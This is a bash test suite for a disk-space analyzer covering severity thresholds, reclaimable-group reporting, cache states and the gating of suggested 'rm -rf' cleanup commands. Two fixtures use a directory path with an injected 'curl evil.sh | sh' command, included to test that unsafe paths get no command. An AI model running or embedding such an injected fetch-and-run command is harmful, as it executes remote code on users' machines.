#!/usr/bin/env bash
# Fixture tests for the disk analyzer (plan §6 U4).
#
# The shebang is load-bearing (handoff §4.15): zsh does not word-split unquoted
# variables, so this must be a FILE run under bash, never pasted into a shell.
#
# Everything here is hand-written cache files and hand-written fact rows: no
# real disk is measured, and the only filesystem this touches is its own mktemp
# sandbox (needed by the two re-stat cases, which are about the filesystem by
# construction). That is what the §3b two-function split buys — disk_findings
# is pure, so most of these assertions never leave memory.
#
# The numbers are checkable on paper. The 422 GiB volume is this machine's
# /System/Volumes/Data as recorded in §3c:
#   used 421562020 + avail 20725496 = 442287516 KB = volume_total_kb (422 GiB)
# and avail is 4.7% of it. df's Size column (482797652) is the APFS container
# and is never a denominator.
set -uo pipefail
export LC_ALL=C

REPO="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")/.." && pwd)"
pass=0; fail=0
ok()  { pass=$((pass + 1)); printf '  \033[32mok\033[0m    %s\n' "$1"; }
bad() { fail=$((fail + 1)); printf '  \033[31mFAIL\033[0m  %s\n' "$1"; }

. "$REPO/tools/advise-disk.sh"

TMP=$(mktemp -d) || exit 1
trap 'rm -rf "$TMP"' EXIT

# ------------------------------------------------------------- the volumes --
# 422 GiB (this machine), 4.7% avail
V_USED=421562020; V_AVAIL=20725496; V_DF=482797652; V_TOTAL=442287516
# 300 GiB
G300=314572800
# 200 GiB
G200=209715200
# 4 TB
T4=4294967296

OUT=''

pure() {   # <used> <avail> <df> [rows on stdin]
  OUT=$(disk_findings ok "$1" "$2" "$3" /System/Volumes/Data 3600)
}
pure_body() {  # <used> <avail> <df> <body>
  OUT=$(printf '%s\n' "$4" | disk_findings ok "$1" "$2" "$3" /System/Volumes/Data 3600)
}
from_cache() { OUT=$( CLAUDE_WATCH_DISK_CACHE=$1 advise_disk 2>/dev/null ); }

sfield() { printf '%s\n' "$OUT" | awk -F'\t' '$1=="S"{print $(ENVIRON["N"]); exit}' ; }
S()      { N=$1 sfield; }
ffield() { printf '%s\n' "$OUT" | awk -F'\t' '$1=="F" && $3==ENVIRON["FID"]{print $(ENVIRON["N"]); exit}'; }
F()      { FID=$1 N=$2 ffield; }
nfind()  { printf '%s\n' "$OUT" | grep -c '^F' ; }

eq() {  # <desc> <got> <want>
  if [ "$2" = "$3" ]; then ok "$1"; else bad "$1 (got '$2', wanted '$3')"; fi
}
has() { # <desc> <haystack> <needle>
  case $2 in *"$3"*) ok "$1" ;; *) bad "$1 (missing '$3' in '$2')" ;; esac
}
hasnt() {
  case $2 in *"$3"*) bad "$1 (found '$3' in '$2')" ;; *) ok "$1" ;; esac
}

# =========================================================== volume severity ==
echo "volume severity (AND, not or)"

pure "$V_USED" "$V_AVAIL" "$V_DF" < /dev/null
eq "4.7% avail -> critical"            "$(S 3)" critical
eq "  domain measured"                 "$(S 4)" complete
eq "  volume finding severity"         "$(F disk.volume_low 4)" critical
eq "  value is avail_kb"               "$(F disk.volume_low 6)" "$V_AVAIL"
eq "  unit"                            "$(F disk.volume_low 7)" kb
eq "  threshold is 25 GiB in kb"       "$(F disk.volume_low 8)" 26214400
eq "  threshold knob"                  "$(F disk.volume_low 9)" CLAUDE_WATCH_DISK_CRIT_GIB
eq "  share is used/volume_total"      "$(F disk.volume_low 5)" 0.953
eq "  confidence n/a, no reclaim"      "$(F disk.volume_low 10)/$(F disk.volume_low 11)" "0/n/a"
has "  headline names the numbers"     "$(F disk.volume_low 12)" "4.7% free — 19.8 GiB of 422 GiB"
has "  detail names both knobs"        "$(F disk.volume_low 13)" "under the 10% line (CLAUDE_WATCH_DISK_CRIT_PCT) AND under the 25 GiB line"
has "  detail refuses the df size"     "$(F disk.volume_low 13)" "460 GiB APFS container, which is not the denominator"
eq "  no action on a volume finding"   "$(F disk.volume_low 14)" ""

# 15% on a 300 GiB volume: 45 GiB free, under 20% AND under 50 GiB -> warn.
pure $(( G300 - G300 * 15 / 100 )) $(( G300 * 15 / 100 )) 0 < /dev/null
eq "15% of 300 GiB (45 GiB) -> warn"   "$(S 3)" warn
eq "  warn knob is named"              "$(F disk.volume_low 9)" CLAUDE_WATCH_DISK_WARN_GIB

# NOTE — §6 U4's verify list says "15% avail on a 422 GiB volume (warn)". That
# predates the AND fix in the same document: 15% of 422 GiB is 63.3 GiB, which
# is NOT under the 50 GiB warn line, so under AND it is `ok`. Pinned here
# deliberately, because it is the same failure class as the 4 TB case below.
pure $(( V_TOTAL - V_TOTAL * 15 / 100 )) $(( V_TOTAL * 15 / 100 )) "$V_DF" < /dev/null
eq "15% of 422 GiB (63 GiB) -> ok"     "$(S 3)" ok
eq "  and emits no finding"            "$(nfind)" 0

pure $(( V_TOTAL - V_TOTAL * 60 / 100 )) $(( V_TOTAL * 60 / 100 )) "$V_DF" < /dev/null
eq "60% avail -> ok"                   "$(S 3)" ok
eq "  no findings"                     "$(nfind)" 0
eq "  still measured, not unknown"     "$(S 4)" complete
has "  summary says what was checked"  "$(S 6)" "60.0% free"

# THE REGRESSION TEST: 4 TB volume, 399 GiB free. 9.7% is under the 10% line,
# but 399 GiB is nowhere near the 25 GiB line. With `or` this reports critical
# — a constant verdict wearing a number's clothes.
pure $(( T4 - 399 * 1048576 )) $(( 399 * 1048576 )) 0 < /dev/null
eq "4 TB with 399 GiB free -> ok"      "$(S 3)" ok
eq "  no volume finding"               "$(nfind)" 0
has "  summary shows the TiB size"     "$(S 6)" "9.7% free (399 GiB of 4.0 TiB)"

echo "volume threshold boundaries"
# crit percent line: exactly 10% is not "< 10%".
pure $(( G200 - G200 / 10 )) $(( G200 / 10 )) 0 < /dev/null
eq "avail exactly 10% -> warn"         "$(S 3)" warn
pure $(( G200 - G200 / 10 + 1 )) $(( G200 / 10 - 1 )) 0 < /dev/null
eq "avail one KB under 10% -> crit"    "$(S 3)" critical
# crit GiB line on a 300 GiB volume (8.3% avail, so the percent test passes).
pure $(( G300 - 26214400 )) 26214400 0 < /dev/null
eq "avail exactly 25 GiB -> warn"      "$(S 3)" warn
pure $(( G300 - 26214399 )) 26214399 0 < /dev/null
eq "avail one KB under 25 GiB -> crit" "$(S 3)" critical
# warn GiB line: 12% of a 500 GiB volume is 60 GiB -> over the 50 GiB line.
pure $(( 524288000 - 62914560 )) 62914560 0 < /dev/null
eq "12% but 60 GiB free -> ok"         "$(S 3)" ok
pure $(( 524288000 - 52428800 )) 52428800 0 < /dev/null
eq "10.0% and exactly 50 GiB -> ok"    "$(S 3)" ok
pure $(( 524288000 - 52428799 )) 52428799 0 < /dev/null
eq "one KB under 50 GiB -> warn"       "$(S 3)" warn
# warn percent line, both sides. On a 200 GiB volume 20% is 40 GiB, so the
# GiB half of the AND passes and the percent half is the one under test.
pure $(( G200 - G200 / 5 )) $(( G200 / 5 )) 0 < /dev/null
eq "avail exactly 20% -> ok"           "$(S 3)" ok
pure $(( G200 - G200 / 5 + 1 )) $(( G200 / 5 - 1 )) 0 < /dev/null
eq "avail one KB under 20% -> warn"    "$(S 3)" warn

# ============================================================ group findings ==
echo "reclaimable groups"
# 2% of 442287516 = 8845750.32 KB. Both sides of this boundary (8.4 GiB) clear
# the 5 GiB floor on their own, so the floor knob is pinned high here to keep
# testing the percent gate in isolation.
BOUND_IN="group	rebuildable	8845751	4	0"
BOUND_OUT="group	rebuildable	8845750	4	0"

CLAUDE_WATCH_DISK_GROUP_WARN_GIB=1000 pure_body "$V_USED" "$V_AVAIL" "$V_DF" "$BOUND_IN"
eq "group at 2% + 1 KB is surfaced"    "$(F disk.reclaimable.rebuildable 3)" disk.reclaimable.rebuildable
eq "  threshold is 2% of the volume"   "$(F disk.reclaimable.rebuildable 8)" 8845751
eq "  threshold knob"                  "$(F disk.reclaimable.rebuildable 9)" CLAUDE_WATCH_DISK_GROUP_WARN_PCT
eq "  reclaim_kb is the group size"    "$(F disk.reclaimable.rebuildable 10)" 8845751

CLAUDE_WATCH_DISK_GROUP_WARN_GIB=1000 pure_body "$V_USED" "$V_AVAIL" "$V_DF" "$BOUND_OUT"
eq "group at 2% - 1 KB is not shown"   "$(nfind)" 1
has "  summary says nothing qualified" "$(S 6)" "no group over 2% of the volume"

echo "reclaimable groups: absolute GiB floor"
# 5*1048576 = 5242880 KB. The percent knob is pinned high here so it never
# admits on its own, isolating the floor.
GFLOOR_IN="group	rebuildable	5242880	4	0"
GFLOOR_OUT="group	rebuildable	5242879	4	0"
CLAUDE_WATCH_DISK_GROUP_WARN_PCT=100 pure_body "$V_USED" "$V_AVAIL" "$V_DF" "$GFLOOR_IN"
eq "group at exactly the GiB floor publishes" "$(nfind)" 2
CLAUDE_WATCH_DISK_GROUP_WARN_PCT=100 pure_body "$V_USED" "$V_AVAIL" "$V_DF" "$GFLOOR_OUT"
eq "one KB under the GiB floor: not shown" "$(nfind)" 1

echo "reclaimable groups: effective threshold (lower bar wins, tie -> percent)"
# Floor-only, on V_TOTAL: the 5 GiB floor (5242880) is lower than the 2%
# bar (8845751), so it is the one reported even though the group is admitted
# by the floor alone.
pure_body 0 "$V_TOTAL" "$V_DF" "group	rebuildable	6291456	3	0"
eq "floor-only: threshold is the GiB floor" "$(F disk.reclaimable.rebuildable 8)" 5242880
eq "  threshold knob is the GiB knob"  "$(F disk.reclaimable.rebuildable 9)" CLAUDE_WATCH_DISK_GROUP_WARN_GIB

# Percent-only, on a 200 GiB volume: 2% (4194304) is lower than the 5 GiB
# floor (5242880), so a group admitted by percent alone reports the percent
# bar.
pure_body 0 "$G200" 0 "group	rebuildable	4194304	3	0"
eq "percent-only: threshold is the percent bar" "$(F disk.reclaimable.rebuildable 8)" 4194304
eq "  threshold knob is the percent knob" "$(F disk.reclaimable.rebuildable 9)" CLAUDE_WATCH_DISK_GROUP_WARN_PCT

# Over both, on an ok volume (so severity is not inherited): 26738688 KB
# clears both bars, but the LOWER bar (the floor) is still what is reported.
# Severity keys off disk_group_pct_admits, not off which bar is printed here
# (item 4): this group is still `warn`, not `info`.
pure_body $(( V_TOTAL - V_TOTAL * 60 / 100 )) $(( V_TOTAL * 60 / 100 )) "$V_DF" "group	rebuildable	26738688	57	0"
eq "over both: threshold is still the lower bar" "$(F disk.reclaimable.rebuildable 8)" 5242880
eq "  threshold knob is the GiB knob"  "$(F disk.reclaimable.rebuildable 9)" CLAUDE_WATCH_DISK_GROUP_WARN_GIB
eq "  but severity is warn (pct-admitted)" "$(F disk.reclaimable.rebuildable 4)" warn

echo "reclaimable groups: severity (floor-admitted vs percent-admitted)"
# Floor-only group on a fully healthy (100% avail) volume: base severity is
# info, not warn, and it raises the domain's worst no further than info.
pure_body 0 "$V_TOTAL" "$V_DF" "group	rebuildable	6291456	3	0"
eq "floor-only group on ok volume -> info" "$(F disk.reclaimable.rebuildable 4)" info
eq "  domain worst is info, not warn"  "$(S 3)" info
has "  and it explains itself"         "$(F disk.reclaimable.rebuildable 13)" "surfaced by the 5 GiB floor"
# Percent-admitted group on an ok volume is still warn: the existing assertion
# further below ("ok volume never demotes group") covers this.

# A critical volume promotes a floor-only group to critical (inheritance can
# still promote a floor-admitted base).
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	rebuildable	6291456	3	0"
eq "critical volume promotes a floor-only group" "$(F disk.reclaimable.rebuildable 4)" critical

# The affected cap applies LAST and can only lower: a floor-only group with
# affected=1 on a critical volume still lands at info, same as any other
# capped group, and carries the same cap sentence.
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	rebuildable	6291456	3	1"
eq "affected floor-only group on critical volume -> info" "$(F disk.reclaimable.rebuildable 4)" info
has "  and it carries the cap sentence" "$(F disk.reclaimable.rebuildable 13)" "capped at info because the scan could not measure all of it"

# Inheritance: severity copied from disk.volume_low, never downward.
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	rebuildable	26738688	57	0"
eq "critical volume promotes group"    "$(F disk.reclaimable.rebuildable 4)" critical
eq "  share is the group's own"        "$(F disk.reclaimable.rebuildable 5)" 0.060
pure_body $(( V_TOTAL - V_TOTAL * 60 / 100 )) $(( V_TOTAL * 60 / 100 )) "$V_DF" "group	rebuildable	26738688	57	0"
eq "ok volume never demotes group"     "$(F disk.reclaimable.rebuildable 4)" warn
pure_body $(( G300 - G300 * 15 / 100 )) $(( G300 * 15 / 100 )) 0 "group	rebuildable	26738688	57	0"
eq "warn volume promotes group to warn" "$(F disk.reclaimable.rebuildable 4)" warn

pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	rebuildable	26738688	57	0"
has "reclaim total is always a floor"  "$(S 6)" "(a floor)"
has "  headline says floor too"        "$(F disk.reclaimable.rebuildable 12)" "a floor"
has "  detail carries the rebuild cost" "$(F disk.reclaimable.rebuildable 13)" "a Rust target takes minutes to tens of minutes"

echo "the 2026-08-19 incident, today's real numbers"
# used 429435388 + avail 22902700 = 452338088 KB, matching the live cache in
# the plan's Context table. The 2% bar is 9046762 KB (8.63 GiB); the 5 GiB
# floor is 5242880 KB. Four of six groups sat below the percent line and were
# silently unpublished. Three of those four clear the 5 GiB floor — caches
# (6.7 GiB), rebuildable (6.4 GiB) and transcripts (5.37 GiB); node_modules,
# at 4.908 GiB, is genuinely under the floor and correctly stays suppressed
# (picked up instead by step 2's aggregate below_threshold finding).
REAL_BODY="group	containers	13259944	4	0
group	downloads	11736728	4	0
group	caches	7024324	4	0
group	rebuildable	6715136	4	0
group	transcripts	5627436	4	0
group	node_modules	5146676	4	0"
pure_body 429435388 22902700 0 "$REAL_BODY"
eq "the incident: containers still published" "$(F disk.reclaimable.containers 3)" disk.reclaimable.containers
eq "  downloads still published"       "$(F disk.reclaimable.downloads 3)" disk.reclaimable.downloads
eq "  caches now published by the floor" "$(F disk.reclaimable.caches 3)" disk.reclaimable.caches
eq "  rebuildable now published by the floor" "$(F disk.reclaimable.rebuildable 3)" disk.reclaimable.rebuildable
eq "  transcripts now published by the floor" "$(F disk.reclaimable.transcripts 3)" disk.reclaimable.transcripts
eq "  node_modules (4.9 GiB) stays under the floor" "$(F disk.reclaimable.node_modules 3)" ""
eq "  five groups published, one volume finding" "$(nfind)" 6
eq "  no below_threshold: the lone suppressed group doesn't clear the bar alone" \
  "$(F disk.reclaimable.below_threshold 3)" ""
has "  but the summary still names it"   "$(S 6)" "1 groups below the line totalling 4.9 GiB (largest node_modules 4.9 GiB)"

echo "the 2026-08-19 incident, before the floor: four groups suppressed, summed"
# Same real numbers, GiB floor pinned out of reach so the world looks exactly
# like it did before step 1: caches, rebuildable, transcripts and node_modules
# all sit under the 2% line alone. Their SUM — 24513572 KB, 23.4 GiB — is what
# the tool printed nothing about: "23.8 GiB reclaimable across 2 groups" while
# 23.5 GiB across four groups vanished with no note, count, or reason.
CLAUDE_WATCH_DISK_GROUP_WARN_GIB=1000 pure_body 429435388 22902700 0 "$REAL_BODY"
eq "containers still published"        "$(F disk.reclaimable.containers 3)" disk.reclaimable.containers
eq "  downloads still published"       "$(F disk.reclaimable.downloads 3)" disk.reclaimable.downloads
eq "  caches suppressed"               "$(F disk.reclaimable.caches 3)" ""
eq "  rebuildable suppressed"          "$(F disk.reclaimable.rebuildable 3)" ""
eq "  transcripts suppressed"          "$(F disk.reclaimable.transcripts 3)" ""
eq "  node_modules suppressed"         "$(F disk.reclaimable.node_modules 3)" ""
eq "  the aggregate finding fires"     "$(F disk.reclaimable.below_threshold 3)" disk.reclaimable.below_threshold
eq "  pinned at info"                  "$(F disk.reclaimable.below_threshold 4)" info
eq "  reclaim_kb is the suppressed sum" "$(F disk.reclaimable.below_threshold 10)" 24513572
has "  headline names the total"       "$(F disk.reclaimable.below_threshold 12)" "23.4 GiB"
has "  and the largest suppressed group" "$(F disk.reclaimable.below_threshold 12)" "caches"
eq "  action is empty, no target named" "$(F disk.reclaimable.below_threshold 14)" ""
hasnt "  and detail never carries rm -rf" "$(F disk.reclaimable.below_threshold 13)" "rm -rf"
has "  summary names all four"         "$(S 6)" "4 groups below the line totalling 23.4 GiB (largest caches 6.7 GiB)"
eq "  containers + downloads + volume + aggregate = 4 findings" "$(nfind)" 4

echo "reclaimable groups: the below_threshold invariant finding"
# Each group individually under the floor (percent knob pinned high in
# isolation), but their sum clears it. Ok volume, so this is the finding's
# ONLY row — the case that pins "never raises worst".
SUM_BODY="group	caches	3000000	4	0
group	rebuildable	3000000	4	0"
CLAUDE_WATCH_DISK_GROUP_WARN_PCT=100 pure_body $(( V_TOTAL - V_TOTAL * 60 / 100 )) $(( V_TOTAL * 60 / 100 )) "$V_DF" "$SUM_BODY"
eq "each group under the floor, sum over it -> fires" "$(F disk.reclaimable.below_threshold 4)" info
eq "  reclaim_kb is the suppressed sum" "$(F disk.reclaimable.below_threshold 10)" 6000000
eq "  threshold is the GiB floor"      "$(F disk.reclaimable.below_threshold 8)" 5242880
eq "  threshold knob is the GiB knob"  "$(F disk.reclaimable.below_threshold 9)" CLAUDE_WATCH_DISK_GROUP_WARN_GIB
has "  headline names the count"       "$(F disk.reclaimable.below_threshold 12)" "2 groups"
has "  and the largest (tie -> first seen)" "$(F disk.reclaimable.below_threshold 12)" "caches"
eq "  action is empty"                 "$(F disk.reclaimable.below_threshold 14)" ""
hasnt "  detail never carries rm -rf"  "$(F disk.reclaimable.below_threshold 13)" "rm -rf"
eq "  it is the domain's only finding" "$(nfind)" 1
eq "  and worst is NOT promoted to info" "$(S 3)" ok

# Each group under the floor, sum ALSO under it: no finding at all.
SUM_UNDER_BODY="group	caches	1000000	4	0
group	rebuildable	1000000	4	0"
CLAUDE_WATCH_DISK_GROUP_WARN_PCT=100 pure_body $(( V_TOTAL - V_TOTAL * 60 / 100 )) $(( V_TOTAL * 60 / 100 )) "$V_DF" "$SUM_UNDER_BODY"
eq "each under, sum also under -> no finding" "$(nfind)" 0
eq "  below_threshold does not fire"   "$(F disk.reclaimable.below_threshold 3)" ""

# A critical volume must not promote the finding above info — it never
# inherits from disk.volume_low, unlike group findings.
CLAUDE_WATCH_DISK_GROUP_WARN_PCT=100 pure_body "$V_USED" "$V_AVAIL" "$V_DF" "$SUM_BODY"
eq "critical volume: below_threshold stays info" "$(F disk.reclaimable.below_threshold 4)" info
eq "  domain worst is critical (from volume_low, not this)" "$(S 3)" critical

echo "reclaimable groups: the developer group (D1c)"
# Over both bars, on an ok volume. Rows come in at `likely`, the only
# confidence the scanner ever writes for sweep rows (step 4a item 5) — so no
# rm -rf is expected here. This is NOT "no command at any confidence": a
# hand-written `confirmed` developer row would produce one exactly like any
# other group, and that path is unreachable from the scanner.
pure_body $(( V_TOTAL - V_TOTAL * 60 / 100 )) $(( V_TOTAL * 60 / 100 )) "$V_DF" "group	developer	26738688	5	0
dir	/Users/x/Library/Developer/Xcode/DerivedData/App-abc	20000000	developer	likely
dir	/Users/x/Library/Developer/CoreSimulator/Devices/blob	6000000	developer	likely"
eq "developer group is published"      "$(F disk.reclaimable.developer 3)" disk.reclaimable.developer
has "  headline names what it is"      "$(F disk.reclaimable.developer 12)" "Xcode simulators, DerivedData and device support (~/Library/Developer)"
has "  detail names the rebuild cost"  "$(F disk.reclaimable.developer 13)" "DerivedData rebuilds in tens of minutes and Xcode re-indexes afterwards"
A=$(F disk.reclaimable.developer 14)
hasnt "  the likely rows carry no command" "$A" "rm -rf"
has "  and say why"                    "$A" "in active use, rebuilt on next build"

# ============================================================== partial scans ==
echo "partial scans"
# Per-group capping: one affected group, one not. The volume finding comes from
# df, which always completes, so it keeps its true severity.
PART="scan	1	0	3	3
note	permission_denied	3	-	-
group	rebuildable	26738688	57	0
group	caches	13369344	9	1"
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "$PART"
eq "domain is partial"                 "$(S 4)" partial
eq "  reason maps to the §3e enum"     "$(S 5)" scan_permission_denied
eq "  volume keeps its severity"       "$(F disk.volume_low 4)" critical
eq "  domain severity still critical"  "$(S 3)" critical
eq "  unaffected group not capped"     "$(F disk.reclaimable.rebuildable 4)" critical
eq "  affected group capped at info"   "$(F disk.reclaimable.caches 4)" info
has "  capped group says why"          "$(F disk.reclaimable.caches 13)" "capped at info because the scan could not measure all of it"
has "  summary leads with E9 verbatim" "$(S 6)" "disk scan could not read 3 directories (permission denied) — the sizes below are a floor. Grant Full Disk Access to your terminal in System Settings > Privacy & Security, or narrow CLAUDE_WATCH_REPO_ROOTS"
has "  remedy is the E9 string"        "$(S 7)" "Grant Full Disk Access to your terminal"
case $(S 6) in "disk scan could not read"*) ok "  reason really leads" ;; *) bad "  reason really leads" ;; esac

DEAD="scan	1	1	12	40
note	deadline	1	-	-
group	rebuildable	26738688	57	1"
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "$DEAD"
eq "deadline maps to scan_deadline"    "$(S 5)" scan_deadline
has "  summary leads with E5 verbatim" "$(S 6)" "disk scan stopped at its 120s deadline after 12 of 40 roots — the sizes below are a floor, not a total. Narrow CLAUDE_WATCH_REPO_ROOTS, or re-run claude-watch disk --refresh when the machine is idle"
eq "  affected group capped"           "$(F disk.reclaimable.rebuildable 4)" info

# A 5th column of '-' is a cache from an older scanner: treat it as affected=0.
OLD="scan	1	0	3	3
note	depth_capped	2	-	-
group	rebuildable	26738688	57	-"
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "$OLD"
eq "missing affected flag = not capped" "$(F disk.reclaimable.rebuildable 4)" critical
eq "  depth_capped has no enum value"  "$(S 5)" ""
eq "  but the domain is still partial" "$(S 4)" partial
has "  and the reason still leads"     "$(S 6)" "disk scan stopped at its depth cap in 2 places"

# ============================================================ confidence gate ==
echo "confidence gates the command"
CONF="group	rebuildable	26738688	57	0
dir	/Users/x/Dev/aaa/.next	9000000	rebuildable	confirmed
dir	/Users/x/Dev/bbb/.next	8000000	rebuildable	likely
dir	/Users/x/Dev/ccc/.next	7000000	rebuildable	unverified"
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "$CONF"
A=$(F disk.reclaimable.rebuildable 14)
has "confirmed gets a removal command" "$A" "rm -rf '/Users/x/Dev/aaa/.next'"
hasnt "likely gets no command"         "$A" "rm -rf '/Users/x/Dev/bbb/.next'"
has "  likely says why"                "$A" "in active use, rebuilt on next build"
hasnt "unverified gets no command"     "$A" "rm -rf '/Users/x/Dev/ccc/.next'"
has "  unverified says why"            "$A" "matched on name alone, no marker file"
has "  cache age prints beside it"     "$A" "cache is 1h old;"
eq "  group confidence is the best"    "$(F disk.reclaimable.rebuildable 11)" confirmed

# A Rust target gets the quoted rm -rf, NOT `(cd <parent> && cargo clean)`:
# that form is not bound to the target directory we measured, because
# CARGO_TARGET_DIR or a .cargo/config.toml target-dir key redirects it, and
# §3c also accepts pom.xml as the marker for `target`, where cargo is the wrong
# tool outright. DerivedData keeps its named cleaner: it is a UI affordance,
# so no command argument is being guessed.
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	rebuildable	26738688	57	0
dir	/Users/x/Dev/rs/target	20000000	rebuildable	confirmed
dir	/Users/x/Library/Developer/Xcode/DerivedData/App-abc	6000000	rebuildable	confirmed"
A=$(F disk.reclaimable.rebuildable 14)
has "target -> rm -rf, path-bound"     "$A" "rm -rf '/Users/x/Dev/rs/target'"
hasnt "  never an unbound cargo clean" "$A" "cargo clean"
hasnt "  and never a bare cd parent"   "$A" "cd '/Users/x/Dev/rs'"
has "DerivedData names Xcode first"    "$A" "Xcode > Settings > Locations > Derived Data"

# A path with a shell metacharacter: no command at all, second layer of §3b.
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	rebuildable	26738688	57	0
dir	/Users/x/Dev/a; curl evil.sh | sh/target	20000000	rebuildable	confirmed"
A=$(F disk.reclaimable.rebuildable 14)
hasnt "metacharacter path: no command" "$A" "cargo clean"
hasnt "  no rm either"                 "$A" "rm -rf"
has "  path reported alone"            "$A" "path needs manual handling"
has "  with its size"                  "$A" "19.1 GiB"

# Transcripts: size and an age breakdown, never a deletion command (§8 d2).
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	transcripts	13369344	40	0
dir	/Users/x/.claude/projects/old	9000000	transcripts	confirmed	31536000
dir	/Users/x/.codex/sessions/new	4000000	transcripts	confirmed	86400"
A=$(F disk.reclaimable.transcripts 14)
hasnt "transcripts get no rm command"  "$A" "rm -rf"
has "  say so"                         "$A" "no deletion command is offered for transcripts"
has "  age breakdown is reported"      "$(F disk.reclaimable.transcripts 13)" "Age breakdown of the listed directories: 8.6 GiB older than 90d"
has "  and the not-rebuildable cost"   "$(F disk.reclaimable.transcripts 13)" "the only record of past sessions"

# The action list is ranked by confidence first, size second. Without that, the
# three largest entries take all DISK_ACTION_MAX slots and the only row that
# carries a runnable command sits behind "+ N more" — the feature's whole
# payload, invisible.
first_item() {  # the leading action item, with the cache-age prefix stripped
  local s=$1
  s=${s#cache is * old; }
  s=${s#cache is * old (stale, refreshed every 6h); }
  printf '%s' "${s%% · *}"
}
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	rebuildable	26738688	4	0
dir	/Users/x/Dev/big1/.next	20000000	rebuildable	likely
dir	/Users/x/Dev/big2/.next	19000000	rebuildable	likely
dir	/Users/x/Dev/big3/.next	18000000	rebuildable	likely
dir	/Users/x/Dev/small/.next	100000	rebuildable	confirmed"
A=$(F disk.reclaimable.rebuildable 14)
has "the one command survives 3 bigger" "$A" "rm -rf '/Users/x/Dev/small/.next'"
has "  and it is listed first"         "$(first_item "$A")" "rm -rf '/Users/x/Dev/small/.next'"
has "  the age prefix rides with it"   "$A" "cache is 1h old;"
has "  the rest are counted"           "$A" "+ 1 more"
has "  and the truncation says why"    "$A" "smaller or without a command"

# Size is still the key INSIDE a tier.
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	rebuildable	26738688	2	0
dir	/Users/x/Dev/c2/.next	10000000	rebuildable	confirmed
dir	/Users/x/Dev/c1/.next	20000000	rebuildable	confirmed"
has "largest confirmed still ranks first" "$(first_item "$(F disk.reclaimable.rebuildable 14)")" "rm -rf '/Users/x/Dev/c1/.next'"

# A confirmed row whose path fails the §3b charset gate carries no command, so
# it must not outrank one that does — even though it is larger.
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	rebuildable	26738688	2	0
dir	/Users/x/Dev/a; curl evil.sh | sh/target	20000000	rebuildable	confirmed
dir	/Users/x/Dev/safe/target	5000000	rebuildable	confirmed"
A=$(F disk.reclaimable.rebuildable 14)
has "commandable outranks unquotable"  "$(first_item "$A")" "rm -rf '/Users/x/Dev/safe/target'"
hasnt "  and the bad path gets no cmd" "$A" "rm -rf '/Users/x/Dev/a;"
has "  it still reports itself"        "$A" "path needs manual handling"

# Transcripts are never commandable, so every row ranks the same and the list
# stays purely size-ordered — this change is a no-op for that group.
pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	transcripts	13369344	2	0
dir	/Users/x/.claude/projects/small	1000000	transcripts	confirmed	86400
dir	/Users/x/.claude/projects/big	9000000	transcripts	likely	86400"
has "transcripts stay largest-first"   "$(first_item "$(F disk.reclaimable.transcripts 14)")" "/Users/x/.claude/projects/big"

# =============================================================== cache states ==
echo "cache states"
from_cache "$TMP/does-not-exist.tsv"
eq "missing cache -> unknown"          "$(S 3)" unknown
eq "  unavailable <=> unknown"         "$(S 4)" unavailable
eq "  reason"                          "$(S 5)" cache_missing
eq "  summary is E10 verbatim"         "$(S 6)" "disk: never scanned, so nothing here is measured. This takes about 10 seconds and is then cached for 6h. Run: claude-watch disk --refresh"
eq "  remedy is E10 too"               "$(S 7)" "disk: never scanned, so nothing here is measured. This takes about 10 seconds and is then cached for 6h. Run: claude-watch disk --refresh"
eq "  and never a finding"             "$(nfind)" 0

NOW=$(date +%s)
good_cache() {  # writes a well-formed cache to $1, extra rows from $2
  printf 'epoch\t-\t%s\t-\t-\nscan\t0\t0\t3\t3\nvol\t/System/Volumes/Data\t%s\t%s\t%s\n%s\n' \
    "$NOW" "$V_USED" "$V_AVAIL" "$V_DF" "$2" > "$1"
}

good_cache "$TMP/ok.tsv" "group	rebuildable	26738688	57	0"
from_cache "$TMP/ok.tsv"
eq "well-formed cache parses"          "$(S 3)" critical
eq "  measurement complete"            "$(S 4)" complete
eq "  no reasons when complete"        "$(S 5)" ""
eq "  no remedy when complete"         "$(S 7)" ""

: > "$TMP/empty.tsv"
from_cache "$TMP/empty.tsv"
eq "empty cache -> cache_missing"      "$(S 5)" cache_missing

printf 'epoch\t-\t%s\t-\t-\nscan\t0\t0\t3\t3\n' "$NOW" > "$TMP/trunc.tsv"
from_cache "$TMP/trunc.tsv"
eq "truncated (no vol row) -> unknown" "$(S 3)" unknown
eq "  unavailable"                     "$(S 4)" unavailable
eq "  reason"                          "$(S 5)" cache_malformed
eq "  never a garbage finding"         "$(nfind)" 0
has "  remedy names the file and fix"  "$(S 7)" "do not parse, so nothing here is measured. Delete that file and re-run: claude-watch disk --refresh"

printf 'epoch\t-\t%s\t-\t-\nscan\t0\t0\t3\t3\nvol\t/x\tlots\t20725496\t0\n' "$NOW" > "$TMP/nan.tsv"
from_cache "$TMP/nan.tsv"
eq "non-numeric used_kb -> malformed"  "$(S 5)" cache_malformed

printf 'epoch\t-\t%s\t-\t-\nscan\t0\t0\t3\t3\nnote\tdeadline\t1\t-\t-\nvol\t/x\t%s\t%s\t0\n' "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/note.tsv"
from_cache "$TMP/note.tsv"
eq "note row without partial=1 -> bad" "$(S 5)" cache_malformed

printf 'epoch\t-\t%s\t-\t-\nvol\t/x\t%s\t%s\t0\ndir\t/p\t100\trebuildable\tmaybe\n' "$NOW" "$V_USED" "$V_AVAIL" > "$TMP/conf.tsv"
from_cache "$TMP/conf.tsv"
eq "unknown confidence -> malformed"   "$(S 5)" cache_malformed

